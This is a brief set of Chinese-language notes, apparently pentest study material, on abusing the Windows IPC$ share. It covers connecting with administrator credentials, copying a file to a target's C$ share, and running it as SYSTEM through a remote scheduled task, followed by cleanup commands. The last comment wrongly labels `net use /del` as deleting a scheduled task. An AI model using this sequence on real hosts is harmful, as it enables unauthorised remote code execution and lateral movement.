- 为了实现进程间通信而开放的命名管道

- 建立ipc$

  - net use \\192.168.16.10\ipc$ "密码" /user:administrator

  - net use

- ipc$利用条件

  - 1.开启139、445端口

  - 2.管理员开启了默认共享

- 利用方式

  - dir \\192.168.18.10\c$

  - tasklist /s 192.168.18.10

  - net time \\192.168.18.10

  - copy 文件 \\IP地址\c$

  - schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f创建计划任务

  - schtasks /run /s IP地址 /i /tn "计划任务名” 执行计划任务

  - schtasks /delete /s IP地址 /tn "计划任务名" /f删除计划任务

  - net use \\IP /del /y删除计划任务